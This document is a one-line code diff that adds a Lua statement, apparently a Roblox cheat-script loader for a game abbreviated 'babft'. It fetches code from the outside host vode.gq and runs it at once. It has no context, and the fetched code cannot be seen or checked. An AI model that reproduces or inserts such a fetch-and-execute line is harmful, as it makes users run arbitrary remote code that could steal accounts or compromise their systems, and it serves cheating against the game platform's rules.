@@ -1,0 +1,1 @@
+loadstring(game:HttpGet'https://vode.gq/r/babft')()
